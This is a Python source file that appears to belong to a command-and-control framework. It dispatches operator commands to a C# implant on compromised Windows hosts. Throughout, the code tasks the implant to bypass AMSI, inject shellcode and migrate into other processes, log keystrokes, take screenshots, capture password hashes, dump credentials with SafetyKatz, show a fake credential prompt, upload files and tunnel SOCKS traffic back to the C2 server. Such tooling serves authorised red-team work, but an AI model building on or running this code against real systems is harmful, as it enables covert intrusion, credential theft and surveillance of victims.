import base64, re, traceback, os, string, sys
from Alias import cs_alias, cs_replace
from Colours import Colours
from Utils import validate_sleep_time
from DB import new_task, update_sleep, unhide_implant, kill_implant, get_implantdetails, get_sharpurls, select_item, new_c2_message, update_label
from AutoLoads import check_module_loaded, run_autoloads_sharp
from Help import sharp_help1
from Config import POSHDIR, ROOTDIR, SocksHost, PayloadsDirectory
from Utils import argp, load_file, gen_key
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style
from CommandPromptCompleter import FilePathCompleter


def handle_sharp_command(command, user, randomuri, startup, implant_id, commandloop):

    try:
        check_module_loaded("Stage2-Core.exe", randomuri, user)
    except Exception as e:
        print("Error loading Stage2-Core.exe: %s" % e)

    # alias mapping
    for alias in cs_alias:
        if alias[0] == command[:len(command.rstrip())]:
            command = alias[1]

    # alias replace
    for alias in cs_replace:
        if command.startswith(alias[0]):
            command = command.replace(alias[0], alias[1])

    original_command = command
    command = command.strip()

    run_autoloads_sharp(command, randomuri, user)

    if command.startswith("searchhelp"):
        searchterm = (command).replace("searchhelp ", "")
        helpful = sharp_help1.split('\n')
        for line in helpful:
            if searchterm in line.lower():
                print(Colours.GREEN + line)

    elif command == "quit":
        ri = input("Are you sure you want to quit? (Y/n) ")
        if ri.lower() == "n":
            startup(user)
        if ri == "" or ri.lower() == "y":
            new_c2_message("%s logged off." % user)
            sys.exit(0)

    elif command.startswith("upload-file"):
        source = ""
        destination = ""
        s = ""
        if command == "upload-file":
            style = Style.from_dict({
                '': '#80d130',
            })
            session = PromptSession(history=FileHistory('%s/.upload-history' % ROOTDIR), auto_suggest=AutoSuggestFromHistory(), style=style)
            try:
                source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
                source = PayloadsDirectory + source
            except KeyboardInterrupt:
                commandloop(implant_id, user)
            while not os.path.isfile(source):
                print("File does not exist: %s" % source)
                source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
                source = PayloadsDirectory + source
            destination = session.prompt("Location to upload to: ")
        else:
            args = argp(command)
            source = args.source
            destination = args.destination
        try:
            with open(source, "rb") as source_file:
                s = source_file.read()
            if s:
                sourceb64 = base64.b64encode(s).decode("utf-8")
                destination = destination.replace("\\", "\\\\")
                print("")
                print("Uploading %s to %s" % (source, destination))
                uploadcommand = "upload-file %s;\"%s\"" % (sourceb64, destination)
                new_task(uploadcommand, user, randomuri)
            else:
                print("Source file could not be read or was empty")
        except Exception as e:
            print("Error with source file: %s" % e)
            traceback.print_exc()

    elif command.startswith("unhide-implant"):
        unhide_implant(randomuri)

    elif command.startswith("hide-implant"):
        kill_implant(randomuri)

    elif command == "bypass-amsi":
        new_task("run-exe Core.Program Core bypass-amsi", user, randomuri)

    elif command.startswith("inject-shellcode"):
        params = re.compile("inject-shellcode", re.IGNORECASE)
        params = params.sub("", command)
        style = Style.from_dict({
            '': '#80d130',
        })
        session = PromptSession(history=FileHistory('%s/.shellcode-history' % ROOTDIR), auto_suggest=AutoSuggestFromHistory(), style=style)
        try:
            path = session.prompt("Location of shellcode file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
            path = PayloadsDirectory + path
        except KeyboardInterrupt:
            commandloop(implant_id, user)
        try:
            shellcodefile = load_file(path)
            if shellcodefile is not None:
                new_task("run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile).decode("utf-8"), params, os.path.basename(path)), user, randomuri)
        except Exception as e:
            print("Error loading file: %s" % e)

    elif command.startswith("migrate"):
        params = re.compile("migrate", re.IGNORECASE)
        params = params.sub("", command)
        migrate(randomuri, user, params)

    elif command == "kill-implant" or command == "exit":
        impid = get_implantdetails(randomuri)
        ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
        if ri.lower() == "n":
            print("Implant not terminated")
        if ri == "":
            new_task("exit", user, randomuri)
            kill_implant(randomuri)
        if ri.lower() == "y":
            new_task("exit", user, randomuri)
            kill_implant(randomuri)

    elif command == "sharpsocks":
        from random import choice
        allchar = string.ascii_letters
        channel = "".join(choice(allchar) for x in range(25))
        sharpkey = gen_key().decode("utf-8")
        sharpurls = get_sharpurls()
        sharpurls = sharpurls.split(",")
        sharpurl = select_item("HostnameIP", "C2Server")
        print(POSHDIR + "SharpSocks/SharpSocksServerCore -c=%s -k=%s --verbose -l=%s\r\n" % (channel, sharpkey, SocksHost) + Colours.GREEN)
        ri = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
        if ri.lower() == "n":
            print("")
        if ri == "":
            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)
        if ri.lower() == "y":
            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)

    elif (command.startswith("stop-keystrokes")):
        new_task("run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
        update_label("", randomuri)

    elif (command.startswith("start-keystrokes")):
        check_module_loaded("Logger.exe", randomuri, user)
        new_task("run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
        update_label("KEYLOG", randomuri)

    elif (command.startswith("get-keystrokes")):
        new_task("run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)

    elif (command.startswith("kill-process")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("get-idletime")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("get-screenshotmulti")):
        new_task(command, user, randomuri)
        update_label("SCREENSHOT", randomuri)

    elif (command.startswith("create-lnk")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("create-startuplnk")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("get-screenshot")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("get-hash")):
        check_module_loaded("InternalMonologue.exe", randomuri, user)
        new_task("run-exe InternalMonologue.Program InternalMonologue", user, randomuri)

    elif (command.startswith("arpscan")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("testadcredential")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("testlocalcredential")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("turtle")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("get-userinfo")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("get-computerinfo")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("get-dodgyprocesses")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("get-content")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("resolvednsname")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("resolveip")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("safetykatz")):
        new_task("run-exe SafetyKatz.Program %s" % command, user, randomuri)

    elif (command.startswith("get-creds")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("cred-popper")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("get-serviceperms")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("copy ")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("move ")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("delete ")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif command == "ls":
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("ls ")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif command == "pwd":
        new_task("run-exe Core.Program Core pwd", user, randomuri)

    elif command == "ps":
        new_task("run-exe Core.Program Core Get-ProcessList", user, randomuri)

    elif command.startswith("loadmoduleforce"):
        params = re.compile("loadmoduleforce ", re.IGNORECASE)
        params = params.sub("", command)
        check_module_loaded(params, randomuri, user, force=True)

    elif command.startswith("loadmodule"):
        params = re.compile("loadmodule ", re.IGNORECASE)
        params = params.sub("", command)
        check_module_loaded(params, randomuri, user)

    elif command.startswith("listmodules"):
        modules = os.listdir("%s/Modules/" % POSHDIR)
        modules = sorted(modules, key=lambda s: s.lower())
        print("")
        print("[+] Available modules:")
        print("")
        for mod in modules:
            if (".exe" in mod) or (".dll" in mod):
                print(mod)       

    elif command.startswith("modulesloaded"):
        ml = get_implantdetails(randomuri)
        print(ml[14])
        new_task("listmodules", user, randomuri)

    elif command == "help" or command == "?":
        print(sharp_help1)

    elif command == "back" or command == "clear":
        startup(user)

    elif command.startswith("beacon") or command.startswith("set-beacon") or command.startswith("setbeacon"):
        new_sleep = command.replace('set-beacon ', '')
        new_sleep = new_sleep.replace('setbeacon ', '')
        new_sleep = new_sleep.replace('beacon ', '').strip()
        if not validate_sleep_time(new_sleep):
            print(Colours.RED)
            print("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
            print(Colours.GREEN)
        else:
            new_task(command, user, randomuri)
            update_sleep(new_sleep, randomuri)

    else:
        if command:
            new_task(original_command, user, randomuri)
        return


def migrate(randomuri, user, params=""):
    implant = get_implantdetails(randomuri)
    implant_arch = implant[10]
    implant_comms = implant[15]

    if implant_arch == "AMD64":
        arch = "64"
    else:
        arch = "86"

    if implant_comms == "C#":
        path = "%spayloads/Sharp_v4_x%s_Shellcode.bin" % (ROOTDIR, arch)
        shellcodefile = load_file(path)
    elif "Daisy" in implant_comms:
        daisyname = input("Name required: ")
        path = "%spayloads/%sSharp_v4_x%s_Shellcode.bin" % (ROOTDIR, daisyname, arch)
        shellcodefile = load_file(path)
    elif "Proxy" in implant_comms:
        path = "%spayloads/ProxySharp_v4_x%s_Shellcode.bin" % (ROOTDIR, arch)
        shellcodefile = load_file(path)

    new_task("run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile).decode("utf-8"), params, os.path.basename(path)), user, randomuri)
